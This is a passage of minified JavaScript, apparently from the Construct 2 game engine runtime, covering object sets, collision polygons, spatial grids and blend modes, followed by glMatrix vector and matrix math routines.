t)if(t.hasOwnProperty(e))return!0;return!1},cr.wipe=function(t){for(var e in t)t.hasOwnProperty(e)&&delete t[e]};var o=+new Date,a=!(cr.performance_now=function(){if(void 0!==window.performance){var t=window.performance;if(void 0!==t.now)return t.now();if(void 0!==t.webkitNow)return t.webkitNow();if(void 0!==t.mozNow)return t.mozNow();if(void 0!==t.msNow)return t.msNow()}return Date.now()-o}),h=!1,c=!1;void 0!==window&&(a=!(/chrome/i.test(navigator.userAgent)||/chromium/i.test(navigator.userAgent))&&/safari/i.test(navigator.userAgent),h=/(iphone|ipod|ipad)/i.test(navigator.userAgent),c=window.c2ejecta);var l=!a&&!c&&!h&&"undefined"!=typeof Set&&void 0!==Set.prototype.forEach;function u(){this.s=null,this.items=null,this.item_count=0,l&&(this.s=new Set),this.values_cache=[],this.cache_valid=!0,cr.seal(this)}u.prototype.contains=function(t){return!this.isEmpty()&&(l?this.s.has(t):this.items&&this.items.hasOwnProperty(t))},u.prototype.add=function(t){var e,i;l?this.s.has(t)||(this.s.add(t),this.cache_valid=!1):(e=t.toString(),(i=this.items)?i.hasOwnProperty(e)||(i[e]=t,this.item_count++,this.cache_valid=!1):(this.items={},this.items[e]=t,this.item_count=1,this.cache_valid=!1))},u.prototype.remove=function(t){var e;this.isEmpty()||(l?this.s.has(t)&&(this.s.delete(t),this.cache_valid=!1):this.items&&(e=t.toString(),(t=this.items).hasOwnProperty(e)&&(delete t[e],this.item_count--,this.cache_valid=!1)))},u.prototype.clear=function(){this.isEmpty()||(l?this.s.clear():(this.items=null,this.item_count=0),cr.clearArray(this.values_cache),this.cache_valid=!0)},u.prototype.isEmpty=function(){return 0===this.count()},u.prototype.count=function(){return l?this.s.size:this.item_count};var p=null,d=0;function g(t){p[d++]=t}u.prototype.update_cache=function(){if(!this.cache_valid){if(l)cr.clearArray(this.values_cache),p=this.values_cache,d=0,this.s.forEach(g),p=null,d=0;else{var t=this.values_cache;cr.clearArray(t);var e,i=0,s=this.items;if(s)for(e in s)s.hasOwnProperty(e)&&(t[i++]=s[e])}this.cache_valid=!0}},u.prototype.valuesRef=function(){return this.update_cache(),this.values_cache},cr.ObjectSet=u;var f=new cr.ObjectSet;function m(){this.c=0,this.y=0,this.t=0,this.sum=0,cr.seal(this)}function y(t){this.pts_cache=[],this.bboxLeft=0,this.bboxTop=0,this.bboxRight=0,this.bboxBottom=0,this.convexpolys=null,this.set_pts(t),cr.seal(this)}function _(t,e){this.cellwidth=t,this.cellheight=e,this.cells={}}function v(t,e){this.cellwidth=t,this.cellheight=e,this.cells={}}cr.removeArrayDuplicates=function(t){for(var e=0,i=t.length;e<i;++e)f.add(t[e]);cr.shallowAssignArray(t,f.valuesRef()),f.clear()},cr.arrayRemoveAllFromObjectSet=function(t,e){l?cr.arrayRemoveAll_set(t,e.s):cr.arrayRemoveAll_arr(t,e.valuesRef())},cr.arrayRemoveAll_set=function(t,e){for(var i,s=0,n=0,r=t.length;s<r;++s)i=t[s],e.has(i)||(t[n++]=i);cr.truncateArray(t,n)},cr.arrayRemoveAll_arr=function(t,e){for(var i,s=0,n=0,r=t.length;s<r;++s)i=t[s],-1===cr.fastIndexOf(e,i)&&(t[n++]=i);cr.truncateArray(t,n)},m.prototype.add=function(t){this.y=t-this.c,this.t=this.sum+this.y,this.c=this.t-this.sum-this.y,this.sum=this.t},m.prototype.reset=function(){this.c=0,this.y=0,this.t=0,this.sum=0},cr.KahanAdder=m,cr.regexp_escape=function(t){return t.replace(/[-[\]{}()*+?.,\\^$|#\s]/g,"\\$&")},y.prototype.set_pts=function(t){this.pts_array=t,this.pts_count=t.length/2,this.pts_cache.length=t.length,this.cache_width=-1,this.cache_height=-1,this.cache_angle=0},y.prototype.is_empty=function(){return!this.pts_array.length},y.prototype.update_bbox=function(){for(var t,e,i=this.pts_cache,s=i[0],n=s,r=i[1],o=r,a=1,h=this.pts_count;a<h;++a)(t=i[e=2*a])<s&&(s=t),n<t&&(n=t),(e=i[1+e])<r&&(r=e),o<e&&(o=e);this.bboxLeft=s,this.bboxRight=n,this.bboxTop=r,this.bboxBottom=o},y.prototype.set_from_rect=function(t,e,i){this.pts_cache.length=8,this.pts_count=4;var s=this.pts_cache;s[0]=t.left-e,s[1]=t.top-i,s[2]=t.right-e,s[3]=t.top-i,s[4]=t.right-e,s[5]=t.bottom-i,s[6]=t.left-e,s[7]=t.bottom-i,this.cache_width=t.right-t.left,this.cache_height=t.bottom-t.top,this.update_bbox()},y.prototype.set_from_quad=function(t,e,i,s,n){this.pts_cache.length=8,this.pts_count=4;var r=this.pts_cache;r[0]=t.tlx-e,r[1]=t.tly-i,r[2]=t.trx-e,r[3]=t.try_-i,r[4]=t.brx-e,r[5]=t.bry-i,r[6]=t.blx-e,r[7]=t.bly-i,this.cache_width=s,this.cache_height=n,this.update_bbox()},y.prototype.set_from_poly=function(t){this.pts_count=t.pts_count,cr.shallowAssignArray(this.pts_cache,t.pts_cache),this.bboxLeft=t.bboxLeft,this.bboxTop=t.bboxTop,this.bboxRight=t.bboxRight,this.bboxBottom=t.bboxBottom},y.prototype.cache_poly=function(t,e,i){if(this.cache_width!==t||this.cache_height!==e||this.cache_angle!==i){var s,n,r,o,a,h;this.cache_width=t,this.cache_height=e,this.cache_angle=i;var c=0,l=1,u=this.pts_array,p=this.pts_cache;for(0!==i&&(c=Math.sin(i),l=Math.cos(i)),s=0,o=this.pts_count;s<o;s++)r=1+(n=2*s),a=u[n]*t,h=u[r]*e,p[n]=a*l-h*c,p[r]=h*l+a*c;this.update_bbox()}},y.prototype.contains_pt=function(t,e){var i=this.pts_cache;if(t===i[0]&&e===i[1])return!0;for(var s,n,r,o,a=this.pts_count,h=this.bboxLeft-110,c=this.bboxTop-101,l=this.bboxRight+131,u=this.bboxBottom+120,p=0,d=0,g=0;g<a;g++)o=(g+1)%a*2,s=i[r=2*g],n=i[1+r],r=i[o],o=i[1+o],cr.segments_intersect(h,c,t,e,s,n,r,o)&&p++,cr.segments_intersect(l,u,t,e,s,n,r,o)&&d++;return p%2==1||d%2==1},y.prototype.intersects_poly=function(t,e,i){var s,n,r,o,a,h,c,l,u,p,d,g,f,m,y=t.pts_cache,_=this.pts_cache;if(this.contains_pt(y[0]+e,y[1]+i))return!0;if(t.contains_pt(_[0]-e,_[1]-i))return!0;for(s=0,o=this.pts_count;s<o;s++)for(r=(s+1)%o*2,c=_[n=2*s],l=_[1+n],u=_[r],p=_[1+r],a=0,h=t.pts_count;a<h;a++)if(m=(a+1)%h*2,d=y[f=2*a]+e,g=y[1+f]+i,f=y[m]+e,m=y[1+m]+i,cr.segments_intersect(c,l,u,p,d,g,f,m))return!0;return!1},y.prototype.intersects_segment=function(t,e,i,s,n,r){var o,a,h,c,l,u,p=this.pts_cache;if(this.contains_pt(i-t,s-e))return!0;for(o=0,a=this.pts_count;o<a;o++)if(u=(o+1)%a*2,h=p[l=2*o]+t,c=p[1+l]+e,l=p[u]+t,u=p[1+u]+e,cr.segments_intersect(i,s,n,r,h,c,l,u))return!0;return!1},y.prototype.mirror=function(t){for(var e,i=0,s=this.pts_count;i<s;++i)e=2*i,this.pts_cache[e]=2*t-this.pts_cache[e]},y.prototype.flip=function(t){for(var e,i=0,s=this.pts_count;i<s;++i)e=2*i+1,this.pts_cache[e]=2*t-this.pts_cache[e]},y.prototype.diag=function(){for(var t,e,i,s=0,n=this.pts_count;s<n;++s)e=1+(t=2*s),i=this.pts_cache[t],this.pts_cache[t]=this.pts_cache[e],this.pts_cache[e]=i},cr.CollisionPoly=y,_.prototype.totalCellCount=0,_.prototype.getCell=function(t,e,i){var s,n=this.cells[t];return n?(s=n[e])||(i?(s=w(this,t,e),this.cells[t][e]=s):null):i?(s=w(this,t,e),this.cells[t]={},this.cells[t][e]=s):null},_.prototype.XToCell=function(t){return cr.floor(t/this.cellwidth)},_.prototype.YToCell=function(t){return cr.floor(t/this.cellheight)},_.prototype.update=function(t,e,i){var s,n,r,o,a;if(e)for(s=e.left,n=e.right;s<=n;++s)for(r=e.top,o=e.bottom;r<=o;++r)i&&i.contains_pt(s,r)||(a=this.getCell(s,r,!1))&&(a.remove(t),a.isEmpty()&&(a=a,_.prototype.totalCellCount--,a.objects.clear(),b.length<1e3&&b.push(a),this.cells[s][r]=null));if(i)for(s=i.left,n=i.right;s<=n;++s)for(r=i.top,o=i.bottom;r<=o;++r)e&&e.contains_pt(s,r)||this.getCell(s,r,!0).insert(t)},_.prototype.queryRange=function(t,e){for(var i,s,n=this.XToCell(t.left),r=this.YToCell(t.top),o=this.XToCell(t.right),a=this.YToCell(t.bottom);n<=o;++n)for(i=r;i<=a;++i)(s=this.getCell(n,i,!1))&&s.dump(e)},cr.SparseGrid=_,v.prototype.totalCellCount=0,v.prototype.getCell=function(t,e,i){var s,n=this.cells[t];return n?(s=n[e])||(i?(s=T(this,t,e),this.cells[t][e]=s):null):i?(s=T(this,t,e),this.cells[t]={},this.cells[t][e]=s):null},v.prototype.XToCell=function(t){return cr.floor(t/this.cellwidth)},v.prototype.YToCell=function(t){return cr.floor(t/this.cellheight)},v.prototype.update=function(t,e,i){var s,n,r,o,a;if(e)for(s=e.left,n=e.right;s<=n;++s)for(r=e.top,o=e.bottom;r<=o;++r)i&&i.contains_pt(s,r)||(a=this.getCell(s,r,!1))&&(a.remove(t),a.isEmpty()&&(a=a,v.prototype.totalCellCount--,a.reset(),S.length<1e3&&S.push(a),this.cells[s][r]=null));if(i)for(s=i.left,n=i.right;s<=n;++s)for(r=i.top,o=i.bottom;r<=o;++r)e&&e.contains_pt(s,r)||this.getCell(s,r,!0).insert(t)},v.prototype.queryRange=function(t,e,i,s,n){for(var r,o,a=this.XToCell(t),h=this.YToCell(e),c=this.XToCell(i),l=this.YToCell(s);a<=c;++a)for(r=h;r<=l;++r)(o=this.getCell(a,r,!1))&&o.dump(n)},v.prototype.markRangeChanged=function(t){for(var e,i,s=t.left,n=t.top,r=t.right,o=t.bottom;s<=r;++s)for(e=n;e<=o;++e)(i=this.getCell(s,e,!1))&&(i.is_sorted=!1)},cr.RenderGrid=v;var b=[];function w(t,e,i){var s;return _.prototype.totalCellCount++,b.length?((s=b.pop()).grid=t,s.x=e,s.y=i,s):new cr.GridCell(t,e,i)}function x(t,e,i){this.grid=t,this.x=e,this.y=i,this.objects=new cr.ObjectSet}x.prototype.isEmpty=function(){return this.objects.isEmpty()},x.prototype.insert=function(t){this.objects.add(t)},x.prototype.remove=function(t){this.objects.remove(t)},x.prototype.dump=function(t){cr.appendArray(t,this.objects.valuesRef())},cr.GridCell=x;var S=[];function T(t,e,i){var s;return v.prototype.totalCellCount++,S.length?((s=S.pop()).grid=t,s.x=e,s.y=i,s):new cr.RenderCell(t,e,i)}function C(t,e,i){this.grid=t,this.x=e,this.y=i,this.objects=[],this.is_sorted=!0,this.pending_removal=new cr.ObjectSet,this.any_pending_removal=!1}function O(t,e){return t.zindex-e.zindex}C.prototype.isEmpty=function(){return!this.objects.length||!(this.objects.length>this.pending_removal.count())&&(this.flush_pending(),!0)},C.prototype.insert=function(t){if(this.pending_removal.contains(t))return this.pending_removal.remove(t),void(this.pending_removal.isEmpty()&&(this.any_pending_removal=!1));this.objects.length?(this.objects[this.objects.length-1].get_zindex()>t.get_zindex()&&(this.is_sorted=!1),this.objects.push(t)):(this.objects.push(t),this.is_sorted=!0)},C.prototype.remove=function(t){this.pending_removal.add(t),this.any_pending_removal=!0,30<=this.pending_removal.count()&&this.flush_pending()},C.prototype.flush_pending=function(){this.any_pending_removal&&(this.pending_removal.count()!==this.objects.length?(cr.arrayRemoveAllFromObjectSet(this.objects,this.pending_removal),this.pending_removal.clear(),this.any_pending_removal=!1):this.reset())},C.prototype.ensure_sorted=function(){this.is_sorted||(this.objects.sort(O),this.is_sorted=!0)},C.prototype.reset=function(){cr.clearArray(this.objects),this.is_sorted=!0,this.pending_removal.clear(),this.any_pending_removal=!1},C.prototype.dump=function(t){this.flush_pending(),this.ensure_sorted(),this.objects.length&&t.push(this.objects)},cr.RenderCell=C;var k=["lighter","xor","copy","destination-over","source-in","destination-in","source-out","destination-out","source-atop","destination-atop"];cr.effectToCompositeOp=function(t){return t<=0||11<=t?"source-over":k[t-1]},cr.setGLBlend=function(t,e,i){if(i)switch(t.srcBlend=i.ONE,t.destBlend=i.ONE_MINUS_SRC_ALPHA,e){case 1:t.srcBlend=i.ONE,t.destBlend=i.ONE;break;case 2:break;case 3:t.srcBlend=i.ONE,t.destBlend=i.ZERO;break;case 4:t.srcBlend=i.ONE_MINUS_DST_ALPHA,t.destBlend=i.ONE;break;case 5:t.srcBlend=i.DST_ALPHA,t.destBlend=i.ZERO;break;case 6:t.srcBlend=i.ZERO,t.destBlend=i.SRC_ALPHA;break;case 7:t.srcBlend=i.ONE_MINUS_DST_ALPHA,t.destBlend=i.ZERO;break;case 8:t.srcBlend=i.ZERO,t.destBlend=i.ONE_MINUS_SRC_ALPHA;break;case 9:t.srcBlend=i.DST_ALPHA,t.destBlend=i.ONE_MINUS_SRC_ALPHA;break;case 10:t.srcBlend=i.ONE_MINUS_DST_ALPHA,t.destBlend=i.SRC_ALPHA}},cr.round6dp=function(t){return Math.round(1e6*t)/1e6},cr.equals_nocase=function(t,e){return"string"==typeof t&&"string"==typeof e&&(t.length===e.length&&(t===e||t.toLowerCase()===e.toLowerCase()))},cr.isCanvasInputEvent=function(t){t=t.target;return!t||(t===document||t===window||(!(!document||!document.body||t!==document.body)||!!cr.equals_nocase(t.tagName,"canvas")))}}();var MatrixArray="undefined"!=typeof Float32Array?Float32Array:Array,glMatrixArrayType=MatrixArray,vec3={},mat3={},mat4={},quat4={};vec3.create=function(t){var e=new MatrixArray(3);return t&&(e[0]=t[0],e[1]=t[1],e[2]=t[2]),e},vec3.set=function(t,e){return e[0]=t[0],e[1]=t[1],e[2]=t[2],e},vec3.add=function(t,e,i){return i&&t!==i?(i[0]=t[0]+e[0],i[1]=t[1]+e[1],i[2]=t[2]+e[2],i):(t[0]+=e[0],t[1]+=e[1],t[2]+=e[2],t)},vec3.subtract=function(t,e,i){return i&&t!==i?(i[0]=t[0]-e[0],i[1]=t[1]-e[1],i[2]=t[2]-e[2],i):(t[0]-=e[0],t[1]-=e[1],t[2]-=e[2],t)},vec3.negate=function(t,e){return(e=e||t)[0]=-t[0],e[1]=-t[1],e[2]=-t[2],e},vec3.scale=function(t,e,i){return i&&t!==i?(i[0]=t[0]*e,i[1]=t[1]*e,i[2]=t[2]*e,i):(t[0]*=e,t[1]*=e,t[2]*=e,t)},vec3.normalize=function(t,e){e=e||t;var i=t[0],s=t[1],n=t[2],t=Math.sqrt(i*i+s*s+n*n);return t?1===t?(e[0]=i,e[1]=s,e[2]=n):(t=1/t,e[0]=i*t,e[1]=s*t,e[2]=n*t):(e[0]=0,e[1]=0,e[2]=0),e},vec3.cross=function(t,e,i){i=i||t;var s=t[0],n=t[1],t=t[2],r=e[0],o=e[1],e=e[2];return i[0]=n*e-t*o,i[1]=t*r-s*e,i[2]=s*o-n*r,i},vec3.length=function(t){var e=t[0],i=t[1],t=t[2];return Math.sqrt(e*e+i*i+t*t)},vec3.dot=function(t,e){return t[0]*e[0]+t[1]*e[1]+t[2]*e[2]},vec3.direction=function(t,e,i){i=i||t;var s=t[0]-e[0],n=t[1]-e[1],t=t[2]-e[2];return(e=Math.sqrt(s*s+n*n+t*t))?(e=1/e,i[0]=s*e,i[1]=n*e,i[2]=t*e):(i[0]=0,i[1]=0,i[2]=0),i},vec3.lerp=function(t,e,i,s){return(s=s||t)[0]=t[0]+i*(e[0]-t[0]),s[1]=t[1]+i*(e[1]-t[1]),s[2]=t[2]+i*(e[2]-t[2]),s},vec3.str=function(t){return"["+t[0]+", "+t[1]+", "+t[2]+"]"},mat3.create=function(t){var e=new MatrixArray(9);return t&&(e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e[4]=t[4],e[5]=t[5],e[6]=t[6],e[7]=t[7],e[8]=t[8]),e},mat3.set=function(t,e){return e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e[4]=t[4],e[5]=t[5],e[6]=t[6],e[7]=t[7],e[8]=t[8],e},mat3.identity=function(t){return t[0]=1,t[1]=0,t[2]=0,t[3]=0,t[4]=1,t[5]=0,t[6]=0,t[7]=0,t[8]=1,t},mat3.transpose=function(t,e){if(e&&t!==e)return e[0]=t[0],e[1]=t[3],e[2]=t[6],e[3]=t[1],e[4]=t[4],e[5]=t[7],e[6]=t[2],e[7]=t[5],e[8]=t[8],e;var i=t[1],s=t[2],e=t[5];return t[1]=t[3],t[2]=t[6],t[3]=i,t[5]=t[7],t[6]=s,t[7]=e,t},mat3.toMat4=function(t,e){return(e=e||mat4.create())[15]=1,e[14]=0,e[13]=0,e[12]=0,e[11]=0,e[10]=t[8],e[9]=t[7],e[8]=t[6],e[7]=0,e[6]=t[5],e[5]=t[4],e[4]=t[3],e[3]=0,e[2]=t[2],e[1]=t[1],e[0]=t[0],e},mat3.str=function(t){return"["+t[0]+", "+t[1]+", "+t[2]+", "+t[3]+", "+t[4]+", "+t[5]+", "+t[6]+", "+t[7]+", "+t[8]+"]"},mat4.create=function(t){var e=new MatrixArray(16);return t&&(e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e[4]=t[4],e[5]=t[5],e[6]=t[6],e[7]=t[7],e[8]=t[8],e[9]=t[9],e[10]=t[10],e[11]=t[11],e[12]=t[12],e[13]=t[13],e[14]=t[14],e[15]=t[15]),e},mat4.set=function(t,e){return e[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e[4]=t[4],e[5]=t[5],e[6]=t[6],e[7]=t[7],e[8]=t[8],e[9]=t[9],e[10]=t[10],e[11]=t[11],e[12]=t[12],e[13]=t[13],e[14]=t[14],e[15]=t[15],e},mat4.identity=function(t){return t[0]=1,t[1]=0,t[2]=0,t[3]=0,t[4]=0,t[5]=1,t[6]=0,t[7]=0,t[8]=0,t[9]=0,t[10]=1,t[11]=0,t[12]=0,t[13]=0,t[14]=0,t[15]=1,t},mat4.transpose=function(t,e){if(e&&t!==e)return e[0]=t[0],e[1]=t[4],e[2]=t[8],e[3]=t[12],e[4]=t[1],e[5]=t[5],e[6]=t[9],e[7]=t[13],e[8]=t[2],e[9]=t[6],e[10]=t[10],e[11]=t[14],e[12]=t[3],e[13]=t[7],e[14]=t[11],e[15]=t[15],e;var i=t[1],s=t[2],n=t[3],r=t[6],o=t[7],e=t[11];return t[1]=t[4],t[2]=t[8],t[3]=t[12],t[4]=i,t[6]=t[9],t[7]=t[13],t[8]=s,t[9]=r,t[11]=t[14],t[12]=n,t[13]=o,t[14]=e,t},mat4.determinant=function(t){var e=t[0],i=t[1],s=t[2],n=t[3],r=t[4],o=t[5],a=t[6],h=t[7],c=t[8],l=t[9],u=t[10],p=t[11],d=t[12],g=t[13],f=t[14];return d*l*a*n-c*g*a*n-d*o*u*n+r*g*u*n+c*o*f*n-r*l*f*n-d*l*s*h+c*g*s*h+d*i*u*h-e*g*u*h-c*i*f*h+e*l*f*h+d*o*s*p-r*g*s*p-d*i*a*p+e*g*a*p+r*i*f*p-e*o*f*p-c*o*s*(t=t[15])+r*l*s*t+c*i*a*t-e*l*a*t-r*i*u*t+e*o*u*t},mat4.inverse=function(t,e){e=e||t;var i=t[0],s=t[1],n=t[2],r=t[3],o=t[4],a=t[5],h=t[6],c=t[7],l=t[8],u=t[9],p=t[10],d=t[11],g=t[12],f=t[13],m=t[14],y=t[15],_=i*a-s*o,v=i*h-n*o,b=i*c-r*o,w=s*h-n*a,x=s*c-r*a,S=n*c-r*h,T=l*f-u*g,C=l*m-p*g,O=l*y-d*g,k=u*m-p*f,A=u*y-d*f,E=p*y-d*m,t=1/(_*E-v*A+b*k+w*O-x*C+S*T);return e[0]=(a*E-h*A+c*k)*t,e[1]=(-s*E+n*A-r*k)*t,e[2]=(f*S-m*x+y*w)*t,e[3]=(-u*S+p*x-d*w)*t,e[4]=(-o*E+h*O-c*C)*t,e[5]=(i*E-n*O+r*C)*t,e[6]=(-g*S+m*b-y*v)*t,e[7]=(l*S-p*b+d*v)*t,e[8]=(o*A-a*O+c*T)*t,e[9]=(-i*A+s*O-r*T)*t,e[10]=(g*x-f*b+y*_)*t,e[11]=(-l*x+u*b-d*_)*t,e[12]=(-o*k+a*C-h*T)*t,e[13]=(i*k-s*C+n*T)*t,e[14]=(-g*w+f*v-m*_)*t,e[15]=(l*w-u*v+p*_)*t,e},mat4.toRotationMat=function(t,e){return(e=e||mat4.create())[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[3],e[4]=t[4],e[5]=t[5],e[6]=t[6],e[7]=t[7],e[8]=t[8],e[9]=t[9],e[10]=t[10],e[11]=t[11],e[12]=0,e[13]=0,e[14]=0,e[15]=1,e},mat4.toMat3=function(t,e){return(e=e||mat3.create())[0]=t[0],e[1]=t[1],e[2]=t[2],e[3]=t[4],e[4]=t[5],e[5]=t[6],e[6]=t[8],e[7]=t[9],e[8]=t[10],e},mat4.toInverseMat3=function(t,e){var i=t[0],s=t[1],n=t[2],r=t[4],o=t[5],a=t[6],h=t[8],c=t[9],l=t[10],u=l*o-a*c,p=-l*r+a*h,d=c*r-o*h,t=i*u+s*p+n*d;return t?(t=1/t,(e=e||mat3.create())[0]=u*t,e[1]=(-l*s+n*c)*t,e[2]=(a*s-n*o)*t,e[3]=p*t,e[4]=(l*i-n*h)*t,e[5]=(-a*i+n*r)*t,e[6]=d*t,e[7]=(-c*i+s*h)*t,e[8]=(o*i-s*r)*t,e):null},mat4.multiply=function(t,e,i){i=i||t;var s=t[0],n=t[1],r=t[2],o=t[3],a=t[4],h=t[5],c=t[6],l=t[7],u=t[8],p=t[9],d=t[10],g=t[11],f=t[12],m=t[13],y=t[14],t=t[15],_=e[0],v=e[1],b=e[2],w=e[3],x=e[4],S=e[5],T=e[6],C=e[7],O=e[8],k=e[9],A=e[10],E=e[11],I=e[12],P=e[13],M=e[14],e=e[15];return i[0]=_*s+v*a+b*u+w*f,i[1]=_*n+v*h+b*p+w*m,i[2]=_*r+v*c+b*d+w*y,i[3]=_*o+v*l+b*g+w*t,i[4]=x*s+S*a+T*u+C*f,i[5]=x*n+S*h+T*p+C*m,i[6]=x*r+S*c+T*d+C*y,i[7]=x*o+S*l+T*g+C*t,i[8]=O*s+k*a+A*u+E*f,i[9]=O*n+k*h+A*p+E*m,i[10]=O*r+k*c+A*d+E*y,i[11]=O*o+k*l+A*g+E*t,i[12]=I*s+P*a+M*u+e*f,i[13]=I*n+P*h+M*p+e*m,i[14]=I*r+P*c+M*d+e*y,i[15]=I*o+P*l+M*g+e*t,i},mat4.multiplyVec3=function(t,e,i){i=i||e;var s=e[0],n=e[1],e=e[2];return i[0]=t[0]*s+t[4]*n+t[8]*e+t[12],i[1]=t[1]*s+t[5]*n+t[9]*e+t[13],i[2]=t[2]*s+t[6]*n+t[10]*e+t[14],i},mat4.multiplyVec4=function(t,e,i){i=i||e;var s=e[0],n=e[1],r=e[2],e=e[3];return i[0]=t[0]*s+t[4]*n+t[8]*r+t[12]*e,i[1]=t[1]*s+t[5]*n+t[9]*r+t[13]*e,i[2]=t[2]*s+t[6]*n+t[10]*r+t[14]*e,i[3]=t[3]*s+t[7]*n+t[11]*r+t[15]*e,i},mat4.translate=function(t,e,i){var s,n,r,o,a,h,c,l,u,p,d,g,f=e[0],m=e[1],e=e[2];return i&&t!==i?(s=t[0],n=t[1],r=t[2],o=t[3],a=t[4],h=t[5],c=t[6],l=t[7],u=t[8],p=t[9],d=t[10],g=t[11],i[0]=s,i[1]=n,i[2]=r,i[3]=o,i[4]=a,i[5]=h,i[6]=c,i[7]=l,i[8]=u,i[9]=p,i[10]=d,i[11]=g,i[12]=s*f+a*m+u*e+t[12],i[13]=n*f+h*m+p*e+t[13],i[14]=r*f+c*m+d*e+t[14],i[15]=o*f+l*m+g*e+t[15],i):(t[12]=t[0]*f+t[4]*m+t[8]*e+t[12],t[13]=t[1]*f+t[5]*m+t[9]*e+t[13],t[14]=t[2]*f+t[6]*m+t[10]*e+t[14],t[15]=t[3]*f+t[7]*m+t[11]*e+t[15],t)},mat4.scale=function(t,e,i){var s=e[0],n=e[1],e=e[2];return i&&t!==i?(i[0]=t[0]*s,i[1]=t[1]*s,i[2]=t[2]*s,i[3]=t[3]*s,i[4]=t[4]*n,i[5]=t[5]*n,i[6]=t[6]*n,i[7]=t[7]*n,i[8]=t[8]*e,i[9]=t[9]*e,i[10]=t[10]*e,i[11]=t[11]*e,i[12]=t[12],i[13]=t[13],i[14]=t[14],i[15]=t[15],i):(t[0]*=s,t[1]*=s,t[2]*=s,t[3]*=s,t[4]*=n,t[5]*=n,t[6]*=n,t[7]*=n,t[8]*=e,t[9]*=e,t[10]*=e,t[11]*=e,t)},mat4.rotate=function(t,e,i,s){var n,r,o,a,h,c,l,u,p,d,g,f,m,y,_,v,b,w,x,S,T=i[0],C=i[1],i=i[2],O=Math.sqrt(T*T+C*C+i*i);return O?(1!==O&&(T*=O=1/O,C*=O,i*=O),n=Math.sin(e),o=1-(r=Math.cos(e)),e=t[0],O=t[1],a=t[2],h=t[3],c=t[4],l=t[5],u=t[6],p=t[7],d=t[8],g=t[9],f=t[10],m=t[11],y=T*T*o+r,_=C*T*o+i*n,v=i*T*o-C*n,b=T*C*o-i*n,w=C*C*o+r,x=i*C*o+T*n,S=T*i*o+C*n,T=C*i*o-T*n,C=i*i*o+r,s?t!==s&&(s[12]=t[12],s[13]=t[13],s[14]=t[14],s[15]=t[15]):s=t,s[0]=e*y+c*_+d*v,s[1]=O*y+l*_+g*v,s[2]=a*y+u*_+f*v,s[3]=h*y+p*_+m*v,s[4]=e*b+c*w+d*x,s[5]=O*b+l*w+g*x,s[6]=a*b+u*w+f*x,s[7]=h*b+p*w+m*x,s[8]=e*S+c*T+d*C,s[9]=O*S+l*T+g*C,s[10]=a*S+u*T+f*C,s[11]=h*S+p*T+m*C,s):null},mat4.rotateX=function(t,e,i){var s=Math.sin(e),e=Math.cos(e),n=t[4],r=t[5],o=t[6],a=t[7],h=t[8],c=t[9],l=t[10],u=t[11];return i?t!==i&&(i[0]=t[0],i[1]=t[1],i[2]=t[2],i[3]=t[3],i[12]=t[12],i[13]=t[13],i[14]=t[14],i[15]=t[15]):i=t,i[4]=n*e+h*s,i[5]=r*e+c*s,i[6]=o*e+l*s,i[7]=a*e+u*s,i[8]=n*-s+h*e,i[9]=r*-s+c*e,i[10]=o*-s+l*e,i[11]=a*-s+u*e,i},mat4.rotateY=function(t,e,i){var s=Math.sin(e),e=Math.cos(e),n=t[0],r=t[1],o=t[2],a=t[3],h=t[8],c=t[9],l=t[10],u=t[11];return i?t!==i&&(i[4]=t[4],i[5]=t[5],i[6]=t[6],i[7]=t[7],i[12]=t[12],i[13]=t[13],i[14]=t[14],i[15]=t[15]):i=t,i[0]=n*e+h*-s,i[1]=r*e+c*-s,i[2]=o*e+l*-s,i[3]=a*e+u*-s,i[8]=n*s+h*e,i[9]=r*s+c*e,i[10]=o*s+l*e,i[11]=a*s+u*e,i},mat4.rotateZ=function(t,e,i){var s=Math.sin(e),e=Math.cos(e),n=t[0],r=t[1],o=t[2],a=t[3],h=t[4],c=t[5],l=t[6],u=t[7];return i?t!==i&&(i[8]=t[8],i[9]=t[9],i[10]=t[10],i[11]=t[11],i[12]=t[12],i[13]=t[13],i[14]=t[14],i[15]=t[15]):i=t,i[0]=n*e+h*s,i[1]=r*e+c*s,i[2]=o*e+l*s,i[3]=a*e+u*s,i[4]=n*-s+h*e,i[5]=r*-s+c*e,i[6]=o*-s+l*e,i[7]=a*-s+u*e,i},mat4.frustum=function(t,e,i,s,n,r,o){var a=e-t,h=s-i,c=r-n;return(o=o||mat4.create())[0]=2*n/a,o[1]=0,o[2]=0,o[3]=0,o[4]=0,o[5]=2*n/h,o[6]=0,o[7]=0,o[8]=(e+t)/a,o[9]=(s+i)/h,o[10]=-(r+n)/c,o[11]=-1,o[12]=0,o[13]=0,o[14]=-r*n*2/c,o[15]=0,o},mat4.perspective=function(t,e,i,s,n){return e*=t=i*Math.tan(t*Math.PI/360),mat4.frustum(-e,e,-t,t,i,s,n)},mat4.ortho=function(t,e,i,s,n,r,o){var a=e-t,h=s-i,c=r-n;return(o=o||mat4.create())[0]=2/a,o[1]=0,o[2]=0,o[3]=0,o[4]=0,o[5]=2/h,o[6]=0,o[7]=0,o[8]=0,o[9]=0,o[10]=-2/c,o[11]=0,o[12]=-(t+e)/a,o[13]=-(s+i)/h,o[14]=-(r+n)/c,o[15]=1,o},mat4.lookAt=function(t,e,i,s){s=s||mat4.create();var n,r,o,a,h,c=t[0],l=t[1],t=t[2],u=i[0],p=i[1],d=i[2];return i=e[1],o=e[2],c===e[0]&&l===i&&t===o?mat4.identity(s):(i=c-e[0],o=l-e[1],a=t-e[2],e=p*(a*=h=1/Math.sqrt(i*i+o*o+a*a))-d*(o*=h),d=d*(i*=h)-u*a,u=u*o-p*i,(h=Math.sqrt(e*e+d*d+u*u))?(e*=h=1/h,d*=h,u*=h):u=d=e=0,p=o*u-a*d,n=a*e-i*u,r=i*d-o*e,(h=Math.sqrt(p*p+n*n+r*r))?(p*=h=1/h,n*=h,r*=h):r=n=p=0,s[0]=e,s[1]=p,s[2]=i,s[3]=0,s[4]=d,s[5]=n,s[6]=o,s[7]=0,s[8]=u,s[9]=r,s[10]=a,s[11]=0,s[12]=-(e*c+d*l+u*t),s[13]=-(p*c+n*l+r*t),s[14]=-(i*c+o*l+a*t),s[15]=1,s)},mat4.fromRotationTranslation=function(t,e,i){i=i||mat4.create();var 